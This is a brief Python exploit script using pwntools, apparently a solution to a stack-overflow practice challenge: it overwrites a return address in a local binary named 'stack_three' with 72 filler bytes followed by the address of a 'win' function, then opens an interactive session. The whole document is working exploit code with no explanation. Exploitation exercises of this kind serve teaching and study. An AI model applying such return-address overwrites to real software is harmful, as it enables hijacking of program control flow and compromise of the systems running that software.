from pwn import *

win_addr = p64(0x0000000000401146)
payload = b'a'*72 + win_addr

p = process('./stack_three')
p.sendline(payload)
p.interactive()
